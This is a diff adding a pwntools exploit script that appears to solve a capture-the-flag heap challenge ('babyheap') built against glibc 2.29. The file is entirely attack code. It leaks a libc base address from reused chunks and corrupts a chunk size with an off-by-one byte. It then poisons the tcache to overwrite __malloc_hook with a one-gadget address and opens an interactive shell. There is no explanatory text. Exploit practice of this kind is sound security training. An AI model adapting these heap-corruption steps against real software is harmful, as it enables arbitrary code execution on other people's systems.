@@ -1,0 +1,57 @@
+from pwn import *
+
+exe = ELF("./babyheap_patched")
+libc = ELF("./libc.so")
+ld = ELF("./ld-2.29.so")
+
+script = '''
+breakrva 0x13DE
+breakrva 0x133D
+breakrva 0x1414
+'''
+
+def malloc(size, content):
+    p.sendafter(b"Command:\n> ", b"M")
+    p.sendafter(b"Size:\n> ",f"{size}".encode())
+    p.sendlineafter(b"Content:\n> ", content)
+
+def free(index):
+    p.sendafter(b"Command:\n> ", b"F")
+    p.sendafter(b"Index:\n> ", f"{index}".encode())
+
+def show(index):
+    p.sendafter(b"Command:\n> ", b"S")
+    p.sendafter(b"Index:\n> ", f"{index}".encode())
+
+p = process("./babyheap_patched")
+#p = gdb.debug("./babyheap_patched", gdbscript = script)
+
+for i in range(10):
+    malloc(0xf8, b"A" * 0x8)
+
+for i in range(9):
+    free(i)
+
+for i in range(9):
+    malloc(0xf8, b"A" * 0x8)
+
+show(7)
+p.recvuntil(b"A" * 8)
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1e4e90
+print(hex(libc_base))
+__malloc_hook = libc_base + libc.symbols['__malloc_hook']
+one_shot = libc_base + 0xe2383
+
+free(3)
+free(0)
+free(2)
+malloc(0xf8, b"A" * 0xf8 + p8(0x81))
+free(1)
+malloc(0x178, b"A" * 0xf8 + b"A" * 8 + p64(__malloc_hook)[:-2:])
+malloc(0xf8, b"A" * 8)
+malloc(0xf8, p64(one_shot)[:-2:])
+free(0)
+p.sendafter(b"Command:\n> ", b"M")
+p.sendafter(b"Size:\n> ",f"{10}".encode())
+
+p.interactive()
